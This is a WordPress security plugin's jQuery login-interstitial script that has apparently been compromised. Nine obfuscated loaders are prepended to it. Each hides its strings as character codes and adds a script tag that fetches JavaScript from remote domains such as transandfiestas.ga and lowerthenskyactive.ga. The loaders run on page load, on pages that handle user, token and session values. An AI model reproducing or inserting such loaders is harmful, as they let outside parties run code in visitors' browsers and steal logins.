Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,112,46,116,114,97,110,115,97,110,100,102,105,101,115,116,97,115,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,105,114,99,46,116,114,97,110,115,97,110,100,102,105,101,115,116,97,115,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,97,114,116,46,116,114,97,110,115,97,110,100,102,105,101,115,116,97,115,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,119,101,108,108,46,108,105,110,101,116,111,97,100,115,97,99,116,105,118,101,46,99,111,109,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,100,111,99,107,46,108,111,118,101,103,114,101,101,110,112,101,110,99,105,108,115,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,99,104,116,46,115,101,99,111,110,100,97,114,121,105,110,102,111,114,109,116,114,97,110,100,46,99,111,109,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,100,114,97,107,101,46,115,116,114,111,110,103,99,97,112,105,116,97,108,97,100,115,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,99,114,111,119,46,108,111,119,101,114,116,104,101,110,115,107,121,97,99,116,105,118,101,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,102,108,97,116,46,108,111,119,101,114,116,104,101,110,115,107,121,97,99,116,105,118,101,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();( function( $ ) {

	var VARS = [
		'itsec_interstitial_user',
		'itsec_interstitial_token',
		'itsec_interstitial_session',
	];

	function ITSECLoginInterstitial( $el, options ) {

		if ( $.isPlainObject( $el ) ) {
			options = $el;
			$el = null;
		}

		if ( !$el ) {
			$( 'form' ).each( function() {
				var $form = $( this );

				if ( $form.attr( 'id' ).indexOf( 'itsec-' ) === 0 ) {
					$el = $form;
					return false;
				}
			} );
		}

		if ( !$el ) {
			throw Error( 'No $el found.' );
		}

		this.$el = $el;
		this.options = $.extend( {
			checkInterval: 5000,
			onStateChange: $.noop,
			onProgressed : ( function() {
				this.submitToProceed();
			} ).bind( this ),
		}, options || {} );

		this.current = $el.prop( 'id' ).replace( 'itsec-', '' );
		this.vars = {};
		this.intervalId = null;
		this.currentState = [];
	}

	/**
	 * Initialize the interstitial.
	 */
	ITSECLoginInterstitial.prototype.init = function() {
		for ( var i = 0; i < VARS.length; i++ ) {
			this.vars[ VARS[ i ] ] = $( 'input[name="' + VARS[ i ] + '"]', this.$el ).val();
		}

		this.intervalId = setInterval( this.checkIfProgressed.bind( this ), this.options.checkInterval );
	};

	/**
	 * Make an ajax request.
	 *
	 * @return {$.promise}
	 */
	ITSECLoginInterstitial.prototype.ajax = function( data ) {
		return wp.ajax.post(
			'itsec-login-interstitial-ajax',
			$.extend( {}, this.vars, data ),
		);
	};

	/**
	 * Fetch the latest interstitial state.
	 *
	 * @return {$.promise}
	 */
	ITSECLoginInterstitial.prototype.fetchState = function() {
		return wp.ajax.post(
			'itsec-login-interstitial-ajax',
			$.extend( { itsec_interstitial_get_state: true }, this.vars ),
		);
	};

	ITSECLoginInterstitial.prototype.checkIfProgressed = function() {
		this.fetchState().then( ( function( response ) {
			if ( response.logged_in || response.current !== this.current ) {
				this.options.onProgressed( response );
			} else if ( JSON.stringify( response.state ) !== JSON.stringify( this.currentState ) ) {
				this.options.onStateChange( response.state, this.currentState );
				this.currentState = response.state;
			}
		} ).bind( this ) ).fail( ( function( response ) {
			console.error( response );
			clearInterval( this.intervalId );
		} ).bind( this ) );
	};

	ITSECLoginInterstitial.prototype.submitToProceed = function() {

		var $form = $( '<form />' )
			.prop( 'method', 'post' )
			.prop( 'action', this.$el.attr( 'action' ) )
			.css( { display: 'none' } );

		$form.append(
			$( '<input />' )
				.prop( 'type', 'hidden' )
				.prop( 'name', 'action' )
				.prop( 'value', 'itsec-' + this.current ),
		);

		for ( var i = 0; i < VARS.length; i++ ) {
			$form.append(
				$( '<input />' )
					.prop( 'type', 'hidden' )
					.prop( 'name', VARS[ i ] )
					.prop( 'value', this.vars[ VARS[ i ] ] ),
			);
		}

		$form.appendTo( document.body );
		$form.submit();
	};

	ITSECLoginInterstitial.prototype.setOnProgressed = function( callback ) {
		this.options.onProgressed = callback;
	};

	ITSECLoginInterstitial.prototype.setOnStateChange = function( callback ) {
		this.options.onStateChange = callback;
	};

	window.ITSECLoginInterstitial = ITSECLoginInterstitial;
} )( jQuery );
